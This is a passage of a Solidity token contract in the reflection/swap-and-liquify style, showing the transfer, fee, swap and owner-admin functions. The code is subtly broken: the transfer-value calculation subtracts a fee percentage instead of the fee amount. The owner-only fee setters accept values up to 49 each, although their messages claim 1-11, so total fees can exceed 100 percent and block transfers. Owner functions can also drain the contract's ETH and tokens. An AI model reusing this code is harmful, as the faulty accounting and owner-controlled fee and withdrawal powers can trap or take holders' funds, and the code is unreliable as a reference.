942             require(balanceOf(recipient).add(amount) <= _maxTxAmount, "Already bought maxTxAmount, wait till check off");
943         }
944 
945         // is the token balance of this contract address over the min number of
946         // tokens that we need to initiate a swap + liquidity lock?
947         // also, don't get caught in a circular liquidity event.
948         // also, don't swap & liquify if sender is uniswap pair.
949         uint256 contractTokenBalance = balanceOf(address(this));
950 
951         if(contractTokenBalance >= _maxTxAmount)
952         {
953             contractTokenBalance = _maxTxAmount;
954         }
955 
956         bool overMinTokenBalance = contractTokenBalance >= _numTokensSellToAddToLiquidity;
957         if (!inSwapAndLiquify && swapAndLiquifyEnabled && overMinTokenBalance && sender != uniswapV2Pair) {
958             contractTokenBalance = _numTokensSellToAddToLiquidity;
959             //add liquidity
960             swapAndLiquify(contractTokenBalance);
961         }
962 
963         //indicates if fee should be deducted from transfer
964         bool takeFee = true;
965 
966         //if any account belongs to _isExcludedFromFee account then remove the fee
967         if(_isExcludedFromFee[sender] || _isExcludedFromFee[recipient]){
968             takeFee = false;
969         }
970 
971         //transfer amount, it will take tax and charity fee
972         _tokenTransfer(sender, recipient, amount, takeFee);
973     }
974 
975     function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
976         uint256 toMarketing = contractTokenBalance.mul(_marketingFee).div(_marketingFee.add(_liquidityFee));
977         uint256 toLiquify = contractTokenBalance.sub(toMarketing);
978 
979         // split the contract balance into halves
980         uint256 half = toLiquify.div(2);
981         uint256 otherHalf = toLiquify.sub(half);
982 
983         // capture the contract's current ETH balance.
984         // this is so that we can capture exactly the amount of ETH that the
985         // swap creates, and not make the liquidity event include any ETH that
986         // has been manually sent to the contract
987         uint256 initialBalance = address(this).balance;
988 
989         // swap tokens for ETH
990         uint256 toSwapForEth = half.add(toMarketing);
991         swapTokensForEth(toSwapForEth); // <- this breaks the ETH -> HATE swap when swap+liquify is triggered
992 
993         // how much ETH did we just swap into?
994         uint256 fromSwap = address(this).balance.sub(initialBalance);
995         uint256 newBalance = fromSwap.mul(half).div(toSwapForEth);
996 
997         // add liquidity to uniswap
998         addLiquidity(otherHalf, newBalance);
999 
1000         emit SwapAndLiquify(half, newBalance, otherHalf);
1001 
1002         sendETHToMarketing(fromSwap.sub(newBalance));
1003     }
1004 
1005     function swapTokensForEth(uint256 tokenAmount) private {
1006         // generate the uniswap pair path of token -> weth
1007         address[] memory path = new address[](2);
1008         path[0] = address(this);
1009         path[1] = uniswapV2Router.WETH();
1010 
1011         _approve(address(this), address(uniswapV2Router), tokenAmount);
1012 
1013         // make the swap
1014         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
1015             tokenAmount,
1016             0, // accept any amount of ETH
1017             path,
1018             address(this),
1019             block.timestamp
1020         );
1021     }
1022 
1023     function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
1024         // approve token transfer to cover all possible scenarios
1025         _approve(address(this), address(uniswapV2Router), tokenAmount);
1026 
1027         // add the liquidity
1028         uniswapV2Router.addLiquidityETH{value: ethAmount}(
1029             address(this),
1030             tokenAmount,
1031             0, // slippage is unavoidable
1032             0, // slippage is unavoidable
1033             owner(),
1034             block.timestamp
1035         );
1036     }
1037 
1038     function sendETHToMarketing(uint256 amount) private {
1039        _DeadWalletAddress.transfer(amount); 
1040     }
1041 //     _marketingWalletAddress.transfer(amount);
1042     // We are exposing these functions to be able to manual swap and send
1043     // in case the token is highly valued and 5M becomes too much
1044     function manualSwap() external onlyOwner() {
1045         uint256 contractBalance = balanceOf(address(this));
1046         swapTokensForEth(contractBalance);
1047     }
1048 
1049     function manualSend() public onlyOwner() {
1050         uint256 contractETHBalance = address(this).balance;
1051         sendETHToMarketing(contractETHBalance);
1052     }
1053 
1054     function setSwapAndLiquifyEnabled(bool _swapAndLiquifyEnabled) external onlyOwner(){
1055         swapAndLiquifyEnabled = _swapAndLiquifyEnabled;
1056     }
1057 
1058     function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee) private {
1059         if(!takeFee)
1060             removeAllFee();
1061 
1062         if (_isExcluded[sender] && !_isExcluded[recipient]) {
1063             _transferFromExcluded(sender, recipient, amount);
1064         } else if (!_isExcluded[sender] && _isExcluded[recipient]) {
1065             _transferToExcluded(sender, recipient, amount);
1066         } else if (!_isExcluded[sender] && !_isExcluded[recipient]) {
1067             _transferStandard(sender, recipient, amount);
1068         } else if (_isExcluded[sender] && _isExcluded[recipient]) {
1069             _transferBothExcluded(sender, recipient, amount);
1070         } else {
1071             _transferStandard(sender, recipient, amount);
1072         }
1073 
1074         if(!takeFee)
1075             restoreAllFee();
1076     }
1077 
1078     function _transferStandard(address sender, address recipient, uint256 tAmount) private {
1079         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tMarketingLiquidity) = _getValues(tAmount);
1080         _rOwned[sender] = _rOwned[sender].sub(rAmount);
1081         _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
1082         _takeMarketingLiquidity(tMarketingLiquidity);
1083         _reflectFee(rFee, tFee);
1084         emit Transfer(sender, recipient, tTransferAmount);
1085     }
1086 
1087     function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {
1088         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tMarketingLiquidity) = _getValues(tAmount);
1089         _rOwned[sender] = _rOwned[sender].sub(rAmount);
1090         _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
1091         _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
1092         _takeMarketingLiquidity(tMarketingLiquidity);
1093         _reflectFee(rFee, tFee);
1094         emit Transfer(sender, recipient, tTransferAmount);
1095     }
1096 
1097     function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {
1098         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tMarketingLiquidity) = _getValues(tAmount);
1099         _tOwned[sender] = _tOwned[sender].sub(tAmount);
1100         _rOwned[sender] = _rOwned[sender].sub(rAmount);
1101         _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
1102         _takeMarketingLiquidity(tMarketingLiquidity);
1103         _reflectFee(rFee, tFee);
1104         emit Transfer(sender, recipient, tTransferAmount);
1105     }
1106 
1107     function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {
1108         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tMarketingLiquidity) = _getValues(tAmount);
1109         _tOwned[sender] = _tOwned[sender].sub(tAmount);
1110         _rOwned[sender] = _rOwned[sender].sub(rAmount);
1111         _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
1112         _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
1113         _takeMarketingLiquidity(tMarketingLiquidity);
1114         _reflectFee(rFee, tFee);
1115         emit Transfer(sender, recipient, tTransferAmount);
1116     }
1117 
1118     function _takeMarketingLiquidity(uint256 tMarketingLiquidity) private {
1119         uint256 currentRate = _getRate();
1120         uint256 rMarketingLiquidity = tMarketingLiquidity.mul(currentRate);
1121         _rOwned[address(this)] = _rOwned[address(this)].add(rMarketingLiquidity);
1122         if(_isExcluded[address(this)])
1123             _tOwned[address(this)] = _tOwned[address(this)].add(tMarketingLiquidity);
1124     }
1125 
1126     function _reflectFee(uint256 rFee, uint256 tFee) private {
1127         _rTotal = _rTotal.sub(rFee);
1128         _tFeeTotal = _tFeeTotal.add(tFee);
1129     }
1130 
1131     //to recieve ETH from uniswapV2Router when swapping
1132     receive() external payable {}
1133 
1134     function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
1135         (uint256 tTransferAmount, uint256 tFee, uint256 tMarketingLiquidityFee) = _getTValues(tAmount, _taxFee, _marketingFee.add(_liquidityFee));
1136         uint256 currentRate = _getRate();
1137         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, currentRate);
1138         return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tMarketingLiquidityFee);
1139     }
1140 
1141     function _getTValues(uint256 tAmount, uint256 taxFee, uint256 marketingLiquidityFee) private pure returns (uint256, uint256, uint256) {
1142         uint256 tFee = tAmount.mul(taxFee).div(100);
1143         uint256 tMarketingLiquidityFee = tAmount.mul(marketingLiquidityFee).div(100);
1144         uint256 tTransferAmount = tAmount.sub(tFee).sub(marketingLiquidityFee);
1145         return (tTransferAmount, tFee, tMarketingLiquidityFee);
1146     }
1147 
1148     function _getRValues(uint256 tAmount, uint256 tFee, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
1149         uint256 rAmount = tAmount.mul(currentRate);
1150         uint256 rFee = tFee.mul(currentRate);
1151         uint256 rTransferAmount = rAmount.sub(rFee);
1152         return (rAmount, rTransferAmount, rFee);
1153     }
1154 
1155     function _getRate() private view returns(uint256) {
1156         (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
1157         return rSupply.div(tSupply);
1158     }
1159 
1160     function _getCurrentSupply() private view returns(uint256, uint256) {
1161         uint256 rSupply = _rTotal;
1162         uint256 tSupply = _tTotal;
1163         for (uint256 i = 0; i < _excluded.length; i++) {
1164             if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
1165             rSupply = rSupply.sub(_rOwned[_excluded[i]]);
1166             tSupply = tSupply.sub(_tOwned[_excluded[i]]);
1167         }
1168         if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
1169         return (rSupply, tSupply);
1170     }
1171 
1172     function _getTaxFee() private view returns(uint256) {
1173         return _taxFee;
1174     }
1175 
1176     function _getMaxTxAmount() private view returns(uint256) {
1177         return _maxTxAmount;
1178     }
1179 
1180     function _getETHBalance() public view returns(uint256 balance) {
1181         return address(this).balance;
1182     }
1183 
1184     function _setTaxFee(uint256 taxFee) external onlyOwner() {
1185         require(taxFee >= 1 && taxFee <= 49, 'taxFee should be in 1 - 49');
1186         _taxFee = taxFee;
1187     }
1188 
1189     function _setMarketingFee(uint256 marketingFee) external onlyOwner() {
1190         require(marketingFee >= 1 && marketingFee <= 49, 'marketingFee should be in 1 - 11');
1191         _marketingFee = marketingFee;
1192     }
1193 
1194     function _setLiquidityFee(uint256 liquidityFee) external onlyOwner() {
1195         require(liquidityFee >= 1 && liquidityFee <= 49, 'liquidityFee should be in 1 - 11');
1196         _liquidityFee = liquidityFee;
1197     }
1198 
1199     function _setNumTokensSellToAddToLiquidity(uint256 numTokensSellToAddToLiquidity) external onlyOwner() {
1200         require(numTokensSellToAddToLiquidity >= 10**9 , 'numTokensSellToAddToLiquidity should be greater than total 1e9');
1201         _numTokensSellToAddToLiquidity = numTokensSellToAddToLiquidity;
1202     }
1203 
1204     function _setMaxTxAmount(uint256 maxTxAmount) external onlyOwner() {
1205         require(maxTxAmount >= 10**9 , 'maxTxAmount should be greater than total 1e9');
1206         _maxTxAmount = maxTxAmount;
1207     }
1208 
1209     function recoverTokens(uint256 tokenAmount) public virtual onlyOwner() {
1210         _approve(address(this), owner(), tokenAmount);
1211         _transfer(address(this), owner(), tokenAmount);
1212     }
1213 }